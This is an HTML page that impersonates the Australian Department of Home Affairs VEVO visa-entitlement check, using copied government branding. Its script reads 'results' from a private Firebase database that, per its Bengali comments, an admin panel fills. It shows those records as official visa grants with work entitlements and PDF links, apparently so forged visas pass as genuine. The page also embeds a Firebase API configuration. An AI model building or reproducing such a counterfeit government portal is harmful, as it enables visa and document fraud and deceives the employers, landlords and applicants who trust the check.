<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Visa Entitlement Verification Online (VEVO) - Department of Home Affairs</title>
<!-- Firebase App and Database SDK (v9 compatibility mode) -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44jx762vs/44jx7794n/1000220167.png">
<meta property="og:title" content="Immigration and citizenship · Immigration and citizenship · Become an Australian citizen · Employing overseas workers · Explore visa options · Our online forms">

<style>
body{margin:0;font-family:"Segoe UI",Arial,sans-serif;background:#fff;color:#222;line-height:1.6}
header{background:#002f6c;color:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between; flex-wrap: wrap; gap: 10px;}
header img{height:40px;margin-right:10px}
header h8{font-size:16px;margin:0; font-weight: bold;}
nav a{color:#fff;margin-left:15px;text-decoration:none;font-size:14px; font-weight: 600;}
nav a:hover{text-decoration:underline}

.container{max-width:800px;margin:40px auto;padding:30px;border:1px solid #ddd;border-radius:6px;background:#fafafa; box-shadow: 0 4px 15px rgba(0,0,0,0.05);}
h2{color:#002f6c;text-align:center}
h1{color: #002f6c; font-size: 24px; border-bottom: 2px solid #ddd; padding-bottom: 10px;}

label{display:block;margin-top:15px;font-weight:bold; color: #333;}
input,select{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:4px; box-sizing: border-box; font-size: 15px;}
input:focus, select:focus {outline: none; border-color: #002f6c;}

button{margin-top:20px;padding:12px 20px;background:#002f6c;color:#fff;border:none;border-radius:4px;cursor:pointer; font-size: 15px; font-weight: bold; transition: 0.3s;}
button:hover{background:#004599}

.error{color:#d32f2f;font-weight:bold;margin-top:15px; background: #ffebee; padding: 10px; border-radius: 4px; border: 1px solid #ffcdd2;}

/* Result Box exactly as your Screenshot */
.result-box{background:#fff;border:1px solid #e0e0e0;border-radius:12px;padding:30px;margin-top:30px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center;}
.result-box h3{color:#004a99;margin-top:10px; font-size: 24px;}
.check-mark { color: #008000; font-size: 40px; line-height: 1; margin-bottom: 10px; }

.data-row { display: flex; text-align: left; margin-bottom: 15px; line-height: 1.5; font-size: 17px; flex-wrap: wrap;}
.data-label { font-weight: bold; color: #002d62; min-width: 170px; margin-right: 10px;}
.data-value { color: #333; flex: 1; word-break: break-word; }

footer{background:#001d3d;color:#fff;padding:30px;text-align:center;font-size:13px;margin-top:50px}
footer a{color:#fff;text-decoration:none;margin:0 5px}
footer a:hover{text-decoration:underline}
.social-icons { margin: 15px 0; }
.social-icons img{height:24px;margin:0 8px;vertical-align:middle; filter: brightness(0) invert(1);}
 
     /* 🔒 ইমেজ প্রোটেকশন ক্লাস */
        .protected-img { -webkit-user-select: none; -webkit-touch-callout: none; user-select: none; }
        .bottom-showcase-img { width: 100%; display: block; margin: 0; padding: 0; pointer-events: none; }

        .footer { background-color: black; color: white; padding: 15px 0; text-align: center; position: fixed; bottom: 0; width: 100%; font-size: 12px; left: 0; z-index: 10; }
</style>

</head>
<body>

<header>
  <div style="display:flex;align-items:center;">
    <img src="https://uploads.onecompiler.io/43z9knmhy/442253xud/1000183008.png" alt="Gov Crest">
    <h8>Australian Government Department of Home Affairs</h8>
  </div>
  <nav>
    <a href="#">ImmiAccount</a>
    <a href="#">Visa Entitlement (VEVO)</a>
  </nav>
</header>

<div class="container">
  <h1>Visa Holder Enquiry (VEVO)</h1>
  <p style="color: #555; font-size: 15px;">Please complete the following details to view your visa entitlements. Fields marked * must be completed.</p>
  <label>Document type *</label>
  <select id="docType">
    <option value="">Please choose a document type</option>
    <option value="Passport" selected>Passport</option>
    <option value="ImmiCard">ImmiCard</option>
    <option value="DFTTA">DFTTA</option>
    <option value="PLO56">PLO56 (M56)</option>
    <option value="Titre de Voyage">Titre de Voyage</option>
  </select>

  <label>Full Name *</label>
  <input id="fullName" placeholder="Enter full name">

  <label>Date of Birth *</label>
  <input id="dob" placeholder="DD/MM/YYYY">

  <label>Document / Visa Grant Number *</label>
  <input id="grantNo" placeholder="Enter Visa Grant Number">

  <div style="display: flex; gap: 10px;">
    <button onclick="doSearch()" style="flex: 1;">Submit Check</button>
    <button onclick="resetForm()" style="background:#6c757d; flex: 1;">Clear Form</button>
  </div>

  <div id="resultBox"></div>
</div>

<img src="https://uploads.onecompiler.io/44s55p666/1781817432994/17522.jpg" alt="Showcase Image" 
     class="bottom-showcase-img protected-img"
     ondragstart="return false;" 
     oncontextmenu="return false;">

<script>
// আপনার দেওয়া Firebase Realtime Database কনফিগারেশন (Admin Panel এর সাথে কানেক্টেড)
const firebaseConfig = {
  apiKey: "AIzaSyAWuWBvmDxUMIEsHUqWBO7qGzAXNe_99Zg",
  authDomain: "cyber-security-6140f.firebaseapp.com",
  databaseURL: "https://cyber-security-6140f-default-rtdb.firebaseio.com",
  projectId: "cyber-security-6140f",
  storageBucket: "cyber-security-6140f.firebasestorage.app",
  messagingSenderId: "1050861596081",
  appId: "1:1050861596081:web:614471b48b94be08126190",
  measurementId: "G-W6PTSW7
M8W"
};
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

function doSearch() {
  const grant = document.getElementById("grantNo").value.trim().toUpperCase();
  const box = document.getElementById("resultBox");
  box.innerHTML = "";
  
  if(!grant){ 
    box.innerHTML = "<p class='error'>Please enter your Visa Grant Number / Document Number.</p>"; 
    return; 
  }

  box.innerHTML = "<p style='text-align:center; color:#002f6c; font-weight:bold; margin-top: 20px;'>Searching official records...</p>";

  // Realtime Database থেকে Admin Panel এর সেভ করা ডাটা খোঁজা
  database.ref('certificates/' + grant).once('value').then((snapshot) => {
    if (snapshot.exists()) {
      const found = snapshot.val();
      const now = new Date().toISOString();

      // পিডিএফ বাটনের লজিক
      let pdfAction = "";
      if (found.link && found.link.trim() !== "") {
        pdfAction = `<a href="${found.link}" target="_blank" style="display:block; text-align:center; margin-top:20px; padding:12px; background:#0055a5; color:#fff; text-decoration:none; border-radius:6px; font-weight:bold; font-size: 16px;">📂 Open PDF Document</a>`;
      } else {
        pdfAction = `<div style="text-align:center; margin-top:20px; padding:12px; background:#e9ecef; color:#6c757d; border-radius:6px; font-weight:bold; font-size: 16px;">🚫 Not PDF</div>`;
      }

      // স্ক্রিনশটের মত হুবহু রেজাল্ট ডিজাইন
      box.innerHTML = `
      <div class="result-box">
        <div class="check-mark">✔</div>
        <h3>VEVO Check Results</h3>
        
        <div style="margin-top: 25px;">
          <div class="data-row">
            <div class="data-label">Date provided last checked:</div>
            <div class="data-value">${now}</div>
          </div>
          <div class="data-row">
            <div class="data-label">Grant Date:</div>
            <div class="data-value">${found.start || "N/A"}</div>
          </div>
          <div class="data-row">
            <div class="data-label">Expiry Date:</div>
            <div class="data-value">${found.end || "N/A"}</div>
          </div>
          <div class="data-row">
            <div class="data-label">Visa Name:</div>
            <div class="data-value">${found.name || "N/A"}</div>
          </div>
          <div class="data-row">
            <div class="data-label">Visa Class:</div>
            <div class="data-value">${found.batch || "N/A"}</div>
          </div>
  <div class="data-row">
            <div class="data-label">Visa Details:</div>
            <div class="data-value">${found.course || "N/A"}</div>
          </div>
          <div class="data-row">
            <div class="data-label">Work Entitlement:</div>
            <div class="data-value">${found.issued || "N/A"}</div>
          </div>
        </div>

        ${pdfAction}

        <button onclick="resetForm()" style="width: 100%; font-size: 16px; margin-top: 20px; padding: 14px; background: #004a99; border-radius: 6px;">Close VEVO Check Home</button>
      </div>`;
      
    } else {
      // ডাটাবেসে না পাওয়া গেলে এরর মেসেজ
      box.innerHTML = "<p class='error'>Your VEVO record was not found or incorrect. Please check your Document Number and try again later.</p>";
    }
  }).catch((err) => {
    console.error(err);
    box.innerHTML = "<p class='error'>Server error or connection failed. Please try again.</p>";
  });
}

function resetForm() {
  document.getElementById("grantNo").value = "";
  document.getElementById("dob").value = "";
  document.getElementById("fullName").value = "";
  document.getElementById("docType").value = "Passport";
  document.getElementById("resultBox").innerHTML = "";
  window.scrollTo({ top: 0, behavior: 'smooth' });
}
</script>
</body>
</html>
